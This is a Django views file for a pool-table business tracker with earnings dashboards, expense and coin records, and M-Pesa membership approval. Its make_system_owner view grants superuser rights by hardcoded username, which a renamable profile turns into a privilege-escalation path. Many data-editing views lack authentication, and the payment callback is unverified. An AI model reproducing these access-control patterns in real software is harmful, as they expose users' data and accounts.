from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from datetime import date, timedelta
from decimal import Decimal
import json

from django.conf import settings
from django.contrib import messages
from django.contrib.auth import login, update_session_auth_hash
from django.contrib.auth.decorators import login_required, user_passes_test
from django.contrib.auth.forms import PasswordChangeForm
from django.contrib.auth.models import User
from django.core.paginator import Paginator
from django.db.models import Sum
from django.shortcuts import (
    get_object_or_404,
    redirect,
    render,
)
from django.utils import timezone
from .forms import (
    DailyEarningForm,
    ExpenseForm,
    CoinCollectionForm,
    RegisterForm,
    ProfileForm,
)

from .decorators import membership_required
from .models import (
    Profile,
    MpesaPayment,
    Membership,
    DailyEarning,
    Expense,
    CoinCollection,
)


def money(value):

    if value is None:
        return Decimal("0.00")

    return Decimal(value)




def register(request):
    if request.method == "POST":
        form = RegisterForm(request.POST)

        if form.is_valid():
            user = form.save()

            login(request, user)

            messages.success(
                request,
                "Account created successfully. Welcome to ISC Pool Tracker!"
            )

            return redirect("membership")
    else:
        form = RegisterForm()

    return render(
        request,
        "registration/register.html",
        {"form": form},
    )


@login_required
def profile(request):
    profile, created = Profile.objects.get_or_create(user=request.user)

    if request.method == "POST":
        form = ProfileForm(
            request.POST,
            request.FILES,
            instance=profile,
        )

        if form.is_valid():
            form.save()

            messages.success(
                request,
                "Profile picture updated successfully.",
            )

            return redirect("profile")
    else:
        form = ProfileForm(instance=profile)

    return render(
        request,
        "tracker/profile.html",
        {
            "profile": profile,
            "profile_form": form,
        },
    )


@login_required
def edit_profile(request):
    user = request.user

    if request.method == "POST":
        username = request.POST.get("username", "").strip()
        email = request.POST.get("email", "").strip()

        if not username:
            messages.error(
                request,
                "Username cannot be empty.",
            )
        elif (
            username != user.username
            and type(user).objects.filter(username=username).exists()
        ):
            messages.error(
                request,
                "That username is already in use.",
            )
        else:
            user.username = username
            user.email = email
            user.save()

            messages.success(
                request,
                "Profile updated successfully.",
            )

            return redirect("profile")

    return render(
        request,
        "tracker/edit_profile.html",
    )


@login_required
def change_password(request):
    if request.method == "POST":
        form = PasswordChangeForm(
            request.user,
            request.POST,
        )

        if form.is_valid():
            user = form.save()

            update_session_auth_hash(
                request,
                user,
            )

            messages.success(
                request,
                "Your password has been changed successfully.",
            )

            return redirect("profile")
    else:
        form = PasswordChangeForm(request.user)

    return render(
        request,
        "tracker/change_password.html",
        {
            "form": form,
        },
    )


@login_required
def settings_page(request):
    return render(
        request,
        "tracker/settings.html",
    )
def history(request):
    return render(
        request,
        "tracker/history.html",
    )
@membership_required
def dashboard(request):

    today = date.today()

    # ---------------------------------------------------------
    # DATE RANGES
    # ---------------------------------------------------------

    week_start = (
        today -
        timedelta(days=today.weekday())
    )

    week_end = (
        week_start +
        timedelta(days=6)
    )

    month_start = today.replace(
        day=1
    )

    if month_start.month == 12:

        next_month = date(
            month_start.year + 1,
            1,
            1
        )

    else:

        next_month = date(
            month_start.year,
            month_start.month + 1,
            1
        )

    month_end = (
        next_month -
        timedelta(days=1)
    )

    # ---------------------------------------------------------
    # TODAY
    # ---------------------------------------------------------

    today_earnings = money(
        DailyEarning.objects
        .filter(date=today)
        .aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    today_expenses = money(
        Expense.objects
        .filter(date=today)
        .aggregate(
            total=Sum("amount")
        )["total"]
    )

    today_profit = (
        today_earnings -
        today_expenses
    )

    # ---------------------------------------------------------
    # WEEK
    # ---------------------------------------------------------

    weekly_earnings = money(
        DailyEarning.objects
        .filter(
            date__range=[
                week_start,
                week_end
            ]
        )
        .aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    weekly_expenses = money(
        Expense.objects
        .filter(
            date__range=[
                week_start,
                week_end
            ]
        )
        .aggregate(
            total=Sum("amount")
        )["total"]
    )

    weekly_profit = (
        weekly_earnings -
        weekly_expenses
    )

    # ---------------------------------------------------------
    # MONTH
    # ---------------------------------------------------------

    monthly_earnings = money(
        DailyEarning.objects
        .filter(
            date__range=[
                month_start,
                month_end
            ]
        )
        .aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    monthly_expenses = money(
        Expense.objects
        .filter(
            date__range=[
                month_start,
                month_end
            ]
        )
        .aggregate(
            total=Sum("amount")
        )["total"]
    )

    monthly_profit = (
        monthly_earnings -
        monthly_expenses
    )

    # ---------------------------------------------------------
    # PROFIT MARGINS
    # ---------------------------------------------------------

    if today_earnings:

        today_profit_margin = (
            today_profit /
            today_earnings
        ) * Decimal("100")

    else:

        today_profit_margin = Decimal("0.00")

    if weekly_earnings:

        weekly_profit_margin = (
            weekly_profit /
            weekly_earnings
        ) * Decimal("100")

    else:

        weekly_profit_margin = Decimal("0.00")

    if monthly_earnings:

        monthly_profit_margin = (
            monthly_profit /
            monthly_earnings
        ) * Decimal("100")

    else:

        monthly_profit_margin = Decimal("0.00")

    # ---------------------------------------------------------
    # OVERALL EARNING STATISTICS
    # ---------------------------------------------------------

    earning_days = (
        DailyEarning.objects
        .values("date")
        .distinct()
        .count()
    )

    total_earnings = money(
        DailyEarning.objects
        .aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    total_expenses = money(
        Expense.objects
        .aggregate(
            total=Sum("amount")
        )["total"]
    )

    total_profit = (
        total_earnings -
        total_expenses
    )

    if earning_days > 0:

        average_daily_earnings = (
            total_earnings /
            Decimal(earning_days)
        )

        average_daily_profit = (
            total_profit /
            Decimal(earning_days)
        )

    else:

        average_daily_earnings = Decimal("0.00")
        average_daily_profit = Decimal("0.00")

    # ---------------------------------------------------------
    # EXPECTED EARNINGS
    # ---------------------------------------------------------

    expected_weekly_earnings = (
        average_daily_earnings *
        Decimal("7")
    )

    expected_monthly_earnings = (
        average_daily_earnings *
        Decimal("30")
    )

    # ---------------------------------------------------------
    # BEST AND LOWEST EARNING DAYS
    # ---------------------------------------------------------

    best_day = (
        DailyEarning.objects
        .order_by(
            "-amount_collected",
            "-date"
        )
        .first()
    )

    lowest_day = (
        DailyEarning.objects
        .order_by(
            "amount_collected",
            "date"
        )
        .first()
    )

    # ---------------------------------------------------------
    # LAST 7 DAYS CHART DATA
    # ---------------------------------------------------------

    chart_labels = []
    earnings_chart_values = []
    expense_chart_values = []
    profit_chart_values = []

    for i in range(6, -1, -1):

        chart_date = (
            today -
            timedelta(days=i)
        )

        daily_earnings = money(
            DailyEarning.objects
            .filter(date=chart_date)
            .aggregate(
                total=Sum("amount_collected")
            )["total"]
        )

        daily_expenses = money(
            Expense.objects
            .filter(date=chart_date)
            .aggregate(
                total=Sum("amount")
            )["total"]
        )

        daily_profit = (
            daily_earnings -
            daily_expenses
        )

        chart_labels.append(
            chart_date.strftime("%d %b")
        )

        earnings_chart_values.append(
            float(daily_earnings)
        )

        expense_chart_values.append(
            float(daily_expenses)
        )

        profit_chart_values.append(
            float(daily_profit)
        )

    # ---------------------------------------------------------
    # TARGET VS ACTUAL
    # ---------------------------------------------------------

    target_monthly = Decimal(
        "50000.00"
    )

    target_progress = Decimal(
        "0.00"
    )

    if target_monthly > 0:

        target_progress = (
            monthly_earnings /
            target_monthly
        ) * Decimal("100")

    if target_progress > Decimal("100"):

        target_progress = Decimal(
            "100"
        )

    # ---------------------------------------------------------
    # COIN COLLECTION
    # ---------------------------------------------------------

    latest_coin_collection = (
        CoinCollection.objects
        .order_by(
            "-collection_date",
            "-created_at"
        )
        .first()
    )

    # ---------------------------------------------------------
    # CONTEXT
    # ---------------------------------------------------------

    context = {

        "today": today,

        "week_start": week_start,
        "week_end": week_end,

        "month_start": month_start,
        "month_end": month_end,

        # Today
        "today_earnings": today_earnings,
        "today_expenses": today_expenses,
        "today_profit": today_profit,
        "today_profit_margin": today_profit_margin,

        # Week
        "weekly_earnings": weekly_earnings,
        "weekly_expenses": weekly_expenses,
        "weekly_profit": weekly_profit,
        "weekly_profit_margin": weekly_profit_margin,

        # Month
        "monthly_earnings": monthly_earnings,
        "monthly_expenses": monthly_expenses,
        "monthly_profit": monthly_profit,
        "monthly_profit_margin": monthly_profit_margin,

        # General analytics
        "earning_days": earning_days,
        "average_daily_earnings": average_daily_earnings,
        "average_daily_profit": average_daily_profit,

        "total_earnings": total_earnings,
        "total_expenses": total_expenses,
        "total_profit": total_profit,

        # Expected
        "expected_weekly_earnings": (
            expected_weekly_earnings
        ),

        "expected_monthly_earnings": (
            expected_monthly_earnings
        ),

        # Best / lowest
        "best_day": best_day,
        "lowest_day": lowest_day,

        # Charts
        "chart_labels": chart_labels,

        "chart_values": (
            earnings_chart_values
        ),

        "earnings_chart_values": (
            earnings_chart_values
        ),

        "expense_chart_values": (
            expense_chart_values
        ),

        "profit_chart_values": (
            profit_chart_values
        ),

        # Target
        "target_monthly": target_monthly,
        "target_progress": target_progress,

        # Recent
        "recent_earnings": (
            DailyEarning.objects
            .all()
            .order_by(
                "-date",
                "-id"
            )[:5]
        ),

        "recent_expenses": (
            Expense.objects
            .all()
            .order_by(
                "-date",
                "-id"
            )[:5]
        ),

        # Coin system
        "latest_coin_collection": (
            latest_coin_collection
        ),
    }

    return render(
        request,
        "tracker/dashboard.html",
        context
    )
def add_earning(request):

    if request.method == "POST":

        form = DailyEarningForm(
            request.POST
        )

        if form.is_valid():

            earning = form.save()

            messages.success(
                request,
                (
                    f"Earning of KSh "
                    f"{earning.amount_collected:.2f} "
                    f"saved successfully."
                )
            )

            return redirect(
                "dashboard"
            )

    else:

        form = DailyEarningForm(
            initial={
                "date": date.today()
            }
        )

    return render(
        request,
        "tracker/add_earning.html",
        {
            "form": form
        }
    )
def earnings_list(request):

    earnings = (
        DailyEarning.objects
        .all()
        .order_by(
            "-date",
            "-id"
        )
    )

    total = money(
        earnings.aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    paginator = Paginator(
        earnings,
        7
    )

    page_number = request.GET.get(
        "page"
    )

    earnings_page = (
        paginator.get_page(
            page_number
        )
    )

    return render(
        request,
        "tracker/earnings_list.html",
        {
            "earnings": earnings_page,
            "total": total,
        }
    )
def edit_earning(
    request,
    earning_id
):

    earning = get_object_or_404(
        DailyEarning,
        id=earning_id
    )

    if request.method == "POST":

        form = DailyEarningForm(
            request.POST,
            instance=earning
        )

        if form.is_valid():

            earning = form.save()

            messages.success(
                request,
                (
                    f"Earning of KSh "
                    f"{earning.amount_collected:.2f} "
                    f"updated successfully."
                )
            )

            return redirect(
                "earnings_list"
            )

    else:

        form = DailyEarningForm(
            instance=earning
        )

    return render(
        request,
        "tracker/add_earning.html",
        {
            "form": form,
            "editing": True,
        }
    )
def delete_earning(
    request,
    earning_id
):

    earning = get_object_or_404(
        DailyEarning,
        id=earning_id
    )

    if request.method == "POST":

        amount = (
            earning.amount_collected
        )

        earning.delete()

        messages.success(
            request,
            (
                f"Earning of KSh "
                f"{amount:.2f} "
                f"deleted successfully."
            )
        )

        return redirect(
            "earnings_list"
        )

    return render(
        request,
        "tracker/delete_confirm.html",
        {
            "object": earning,
            "object_type": "earning",
        }
    )
def add_expense(request):

    if request.method == "POST":

        form = ExpenseForm(
            request.POST
        )

        if form.is_valid():

            expense = form.save()

            messages.success(
                request,
                (
                    f"Expense of KSh "
                    f"{expense.amount:.2f} "
                    f"saved successfully."
                )
            )

            return redirect(
                "dashboard"
            )

    else:

        form = ExpenseForm(
            initial={
                "date": date.today()
            }
        )

    return render(
        request,
        "tracker/add_expense.html",
        {
            "form": form
        }
    )
def expenses_list(request):

    expenses = (
        Expense.objects
        .all()
        .order_by(
            "-date",
            "-id"
        )
    )

    total = money(
        expenses.aggregate(
            total=Sum("amount")
        )["total"]
    )

    paginator = Paginator(
        expenses,
        7
    )

    page_number = request.GET.get(
        "page"
    )

    expenses_page = (
        paginator.get_page(
            page_number
        )
    )

    return render(
        request,
        "tracker/expenses_list.html",
        {
            "expenses": expenses_page,
            "total": total,
        }
    )
def edit_expense(
    request,
    expense_id
):

    expense = get_object_or_404(
        Expense,
        id=expense_id
    )

    if request.method == "POST":

        form = ExpenseForm(
            request.POST,
            instance=expense
        )

        if form.is_valid():

            expense = form.save()

            messages.success(
                request,
                (
                    f"Expense of KSh "
                    f"{expense.amount:.2f} "
                    f"updated successfully."
                )
            )

            return redirect(
                "expenses_list"
            )

    else:

        form = ExpenseForm(
            instance=expense
        )

    return render(
        request,
        "tracker/add_expense.html",
        {
            "form": form,
            "editing": True,
        }
    )
def delete_expense(
    request,
    expense_id
):

    expense = get_object_or_404(
        Expense,
        id=expense_id
    )

    if request.method == "POST":

        amount = expense.amount

        expense.delete()

        messages.success(
            request,
            (
                f"Expense of KSh "
                f"{amount:.2f} "
                f"deleted successfully."
            )
        )

        return redirect(
            "expenses_list"
        )

    return render(
        request,
        "tracker/delete_confirm.html",
        {
            "object": expense,
            "object_type": "expense",
        }
    )
def reports(request):

    start_date = request.GET.get(
        "start_date"
    )

    end_date = request.GET.get(
        "end_date"
    )

    earnings = (
        DailyEarning.objects.all()
    )

    expenses = (
        Expense.objects.all()
    )

    if start_date:

        earnings = earnings.filter(
            date__gte=start_date
        )

        expenses = expenses.filter(
            date__gte=start_date
        )

    if end_date:

        earnings = earnings.filter(
            date__lte=end_date
        )

        expenses = expenses.filter(
            date__lte=end_date
        )

    total_earnings = money(
        earnings.aggregate(
            total=Sum("amount_collected")
        )["total"]
    )

    total_expenses = money(
        expenses.aggregate(
            total=Sum("amount")
        )["total"]
    )

    total_profit = (
        total_earnings -
        total_expenses
    )

    earning_dates = (
        earnings
        .values("date")
        .distinct()
        .count()
    )

    if earning_dates:

        average_daily_earnings = (
            total_earnings /
            Decimal(earning_dates)
        )

    else:

        average_daily_earnings = (
            Decimal("0.00")
        )

    if total_earnings:

        profit_margin = (
            total_profit /
            total_earnings
        ) * Decimal("100")

    else:

        profit_margin = Decimal(
            "0.00"
        )

    forecast_monthly = (
        average_daily_earnings *
        Decimal("30")
    )

    breakdown = []

    expense_types = (
        expenses
        .values("expense_type")
        .distinct()
    )

    for row in expense_types:

        expense_type = (
            row["expense_type"]
        )

        amount = money(
            expenses
            .filter(
                expense_type=expense_type
            )
            .aggregate(
                total=Sum("amount")
            )["total"]
        )

        if total_expenses:

            percentage = (
                amount /
                total_expenses
            ) * Decimal("100")

        else:

            percentage = Decimal(
                "0.00"
            )

        display_name = dict(
            Expense.EXPENSE_TYPE_CHOICES
        ).get(
            expense_type,
            expense_type
        )

        breakdown.append(
            {
                "type": display_name,
                "amount": amount,
                "percentage": percentage,
            }
        )

    breakdown.sort(
        key=lambda item: item["amount"],
        reverse=True
    )

    best_day = (
        earnings
        .order_by(
            "-amount_collected"
        )
        .first()
    )

    highest_expense = (
        expenses
        .order_by("-amount")
        .first()
    )

    context = {

        "start_date": start_date,
        "end_date": end_date,

        "total_earnings": total_earnings,
        "total_expenses": total_expenses,
        "total_profit": total_profit,

        "earning_days": earning_dates,

        "average_daily_earnings": (
            average_daily_earnings
        ),

        "forecast_monthly": (
            forecast_monthly
        ),

        "profit_margin": profit_margin,

        "expense_breakdown": breakdown,

        "best_day": best_day,

        "highest_expense": (
            highest_expense
        ),
    }

    return render(
        request,
        "tracker/reports.html",
        context
    )
def generate_report(request):

    return redirect(
        "reports"
    )


# =========================================================
# COIN COLLECTION SYSTEM
# =========================================================
def coin_collection_list(request):

    collections = (
        CoinCollection.objects
        .all()
        .order_by(
            "-collection_date",
            "-created_at"
        )
    )

    today = date.today()

    todays_collections = collections.filter(
        collection_date=today
    )

    todays_coins = (
        todays_collections.aggregate(
            total=Sum("coins_collected")
        )["total"] or 0
    )

    todays_money = (
        todays_collections.aggregate(
            total=Sum("actual_m_pesa")
        )["total"] or Decimal("0.00")
    )

    todays_expected = (
        Decimal(todays_coins) * Decimal("20.00")
    )

    todays_difference = (
        todays_money - todays_expected
    )

    if todays_expected > 0:
        todays_rate = (
            todays_money / todays_expected
        ) * Decimal("100")
    else:
        todays_rate = None

    latest = collections.first()

    return render(
        request,
        "tracker/coin_collections.html",
        {
            "collections": collections,
            "latest": latest,
            "todays_coins": todays_coins,
            "todays_money": todays_money,
            "todays_expected": todays_expected,
            "todays_difference": todays_difference,
            "todays_rate": todays_rate,
            "today": today,
        }
    )
def add_coin_collection(request):

    if request.method == "POST":

        form = CoinCollectionForm(
            request.POST
        )

        if form.is_valid():

            collection = form.save()

            messages.success(
                request,
                (
                    f"{collection.coins_collected} "
                    f"coins recorded successfully. "
                    f"Next expected amount: "
                    f"KSh "
                    f"{collection.next_expected_amount:.2f}"
                )
            )

            return redirect(
                "coin_collections"
            )

    else:

        form = CoinCollectionForm(
            initial={
                "collection_date": date.today(),
                "coin_value": Decimal("20.00"),
            }
        )

    return render(
        request,
        "tracker/add_coin_collection.html",
        {
            "form": form,
        }
    )
def edit_coin_collection(
    request,
    collection_id
):

    collection = get_object_or_404(
        CoinCollection,
        id=collection_id
    )

    if request.method == "POST":

        form = CoinCollectionForm(
            request.POST,
            instance=collection
        )

        if form.is_valid():

            collection = form.save()

            messages.success(
                request,
                (
                    "Coin collection updated successfully."
                )
            )

            return redirect(
                "coin_collections"
            )

    else:

        form = CoinCollectionForm(
            instance=collection
        )

    return render(
        request,
        "tracker/add_coin_collection.html",
        {
            "form": form,
            "editing": True,
            "collection": collection,
        }
    )
def delete_coin_collection(
    request,
    collection_id
):

    collection = get_object_or_404(
        CoinCollection,
        id=collection_id
    )

    if request.method == "POST":

        collection.delete()

        messages.success(
            request,
            "Coin collection deleted successfully."
        )

        return redirect(
            "coin_collections"
        )

    return render(
        request,
        "tracker/delete_confirm.html",
        {
            "object": collection,
            "object_type": "coin collection",
        }
    )











@login_required
def membership(request):

    membership, created = Membership.objects.get_or_create(
        user=request.user,
        defaults={
            "status": Membership.STATUS_TRIAL,
            "trial_started_at": timezone.now(),
            "trial_ends_at": timezone.now() + timedelta(days=7),
        },
    )

    latest_payment = (
        MpesaPayment.objects
        .filter(user=request.user)
        .order_by("-created_at")
        .first()
    )

    pending_payment = (
        MpesaPayment.objects
        .filter(
            user=request.user,
            status=MpesaPayment.STATUS_PENDING,
        )
        .order_by("-created_at")
        .first()
    )

    return render(
        request,
        "tracker/membership.html",
        {
            "membership": membership,
            "latest_payment": latest_payment,
            "pending_payment": pending_payment,
            "membership_amount": settings.MPESA_MEMBERSHIP_AMOUNT,
            "membership_days": settings.MPESA_MEMBERSHIP_DAYS,
            "mpesa_shortcode": settings.MPESA_SHORTCODE,
        },
    )


def _normalize_mpesa_phone(phone_number):
    """
    Normalize common Kenyan phone formats to 2547XXXXXXXX.
    """

    phone = "".join(
        character
        for character in phone_number
        if character.isdigit()
    )

    if phone.startswith("07") and len(phone) == 10:
        return "254" + phone[1:]

    if phone.startswith("01") and len(phone) == 10:
        return "254" + phone[1:]

    if phone.startswith("7") and len(phone) == 9:
        return "254" + phone

    if phone.startswith("1") and len(phone) == 9:
        return "254" + phone

    if phone.startswith("2547") and len(phone) == 12:
        return phone

    if phone.startswith("2541") and len(phone) == 12:
        return phone

    return None


@login_required
def pay_membership(request):

    if request.method != "POST":
        return redirect("membership")

    membership, created = Membership.objects.get_or_create(
        user=request.user,
        defaults={
            "status": Membership.STATUS_TRIAL,
            "trial_started_at": timezone.now(),
            "trial_ends_at": timezone.now() + timedelta(days=7),
        },
    )

    if request.user.is_superuser:
        messages.info(
            request,
            "Your administrator account already has permanent access."
        )
        return redirect("membership")

    if membership.is_active:
        messages.info(
            request,
            "Your membership is already active."
        )
        return redirect("membership")

    existing_pending = (
        MpesaPayment.objects
        .filter(
            user=request.user,
            status=MpesaPayment.STATUS_PENDING,
        )
        .order_by("-created_at")
        .first()
    )

    if existing_pending:
        messages.info(
            request,
            "Your payment is already awaiting admin confirmation."
        )
        return redirect("membership")

    phone_number = request.POST.get(
        "phone_number",
        "",
    ).strip()

    normalized_phone = _normalize_mpesa_phone(phone_number)

    if not normalized_phone:
        messages.error(
            request,
            "Enter a valid Kenyan M-Pesa number."
        )
        return redirect("membership")

    MpesaPayment.objects.create(
        user=request.user,
        amount=settings.MPESA_MEMBERSHIP_AMOUNT,
        phone_number=normalized_phone,
        status=MpesaPayment.STATUS_PENDING,
        result_description=(
            "Payment reported by user. "
            "Awaiting manual admin verification."
        ),
    )

    messages.success(
        request,
        "Payment marked as paid. "
        "Please wait while an admin verifies your M-Pesa payment."
    )

    return redirect("membership")


def mpesa_callback(request):

    if request.method != "POST":
        return JsonResponse(
            {
                "ResultCode": 1,
                "ResultDesc": "Invalid request method.",
            },
            status=405,
        )

    try:

        callback_data = json.loads(
            request.body.decode("utf-8")
        )

        stk_callback = (
            callback_data
            .get("Body", {})
            .get("stkCallback", {})
        )

        checkout_request_id = stk_callback.get(
            "CheckoutRequestID"
        )

        result_code = stk_callback.get(
            "ResultCode"
        )

        result_description = stk_callback.get(
            "ResultDesc",
            "",
        )

        if not checkout_request_id:
            return JsonResponse(
                {
                    "ResultCode": 1,
                    "ResultDesc": "Missing CheckoutRequestID.",
                },
                status=400,
            )

        try:

            payment = MpesaPayment.objects.get(
                checkout_request_id=checkout_request_id
            )

        except MpesaPayment.DoesNotExist:

            return JsonResponse(
                {
                    "ResultCode": 1,
                    "ResultDesc": "Payment not found.",
                },
                status=404,
            )

        payment.result_code = result_code
        payment.result_description = result_description

        if result_code == 0:

            callback_items = (
                stk_callback
                .get("CallbackMetadata", {})
                .get("Item", [])
            )

            receipt_number = None

            for item in callback_items:

                if item.get("Name") == "MpesaReceiptNumber":
                    receipt_number = item.get("Value")
                    break

            payment.mpesa_receipt_number = receipt_number
            payment.status = MpesaPayment.STATUS_SUCCESS
            payment.save()

            membership = Membership.objects.get(
                user=payment.user
            )

            now = timezone.now()

            if (
                membership.status == Membership.STATUS_ACTIVE
                and membership.membership_ends_at
                and membership.membership_ends_at > now
            ):
                start_date = membership.membership_ends_at
            else:
                start_date = now

            membership.status = Membership.STATUS_ACTIVE
            membership.membership_started_at = start_date
            membership.membership_ends_at = (
                start_date
                + timedelta(
                    days=settings.MPESA_MEMBERSHIP_DAYS
                )
            )

            membership.save()

        else:

            payment.status = MpesaPayment.STATUS_FAILED
            payment.save()

        return JsonResponse(
            {
                "ResultCode": 0,
                "ResultDesc": "Accepted",
            }
        )

    except Exception:

        return JsonResponse(
            {
                "ResultCode": 1,
                "ResultDesc": "Callback processing failed.",
            },
            status=500,
        )








@login_required
@user_passes_test(lambda user: user.is_superuser)
def membership_approvals(request):
    pending_payments = (
        MpesaPayment.objects
        .filter(
            status=MpesaPayment.STATUS_PENDING,
        )
        .select_related("user")
        .order_by("-created_at")
    )

    return render(
        request,
        "tracker/membership_approvals.html",
        {
            "pending_payments": pending_payments,
        },
    )


@login_required
@user_passes_test(lambda user: user.is_superuser)
def membership_approval_action(request, payment_id, action):

    if request.method != "POST":
        return redirect("membership_approvals")

    payment = get_object_or_404(
        MpesaPayment,
        id=payment_id,
    )

    if payment.status != MpesaPayment.STATUS_PENDING:
        messages.info(
            request,
            "This payment has already been processed.",
        )
        return redirect("membership_approvals")

    membership, created = Membership.objects.get_or_create(
        user=payment.user,
        defaults={
            "status": Membership.STATUS_TRIAL,
            "trial_started_at": timezone.now(),
            "trial_ends_at": timezone.now() + timedelta(days=7),
        },
    )

    if action == "approve":

        now = timezone.now()

        if (
            membership.membership_ends_at
            and membership.membership_ends_at > now
        ):
            start = membership.membership_ends_at
        else:
            start = now

        membership.status = Membership.STATUS_ACTIVE
        membership.membership_started_at = start
        membership.membership_ends_at = (
            start
            + timedelta(
                days=settings.MPESA_MEMBERSHIP_DAYS,
            )
        )
        membership.save()

        payment.status = MpesaPayment.STATUS_SUCCESS
        payment.result_description = "Approved by admin."
        payment.save()

        messages.success(
            request,
            f"Membership approved for {payment.user.username}.",
        )

    elif action == "deny":

        payment.status = MpesaPayment.STATUS_FAILED
        payment.result_description = "Denied by admin."
        payment.save()

        messages.warning(
            request,
            f"Payment denied for {payment.user.username}.",
        )

    else:
        messages.error(
            request,
            "Invalid membership action.",
        )

    return redirect("membership_approvals")

@login_required
def make_system_owner(request):
    if request.user.username != "isac12":
        return JsonResponse(
            {"error": "Unauthorized"},
            status=403,
        )

    request.user.is_staff = True
    request.user.is_superuser = True
    request.user.is_active = True
    request.user.save(
        update_fields=[
            "is_staff",
            "is_superuser",
            "is_active",
        ]
    )

    return JsonResponse(
        {
            "success": True,
            "message": (
                "isac12 is now the permanent system owner. "
                "Log out and log back in."
            ),
        }
    )
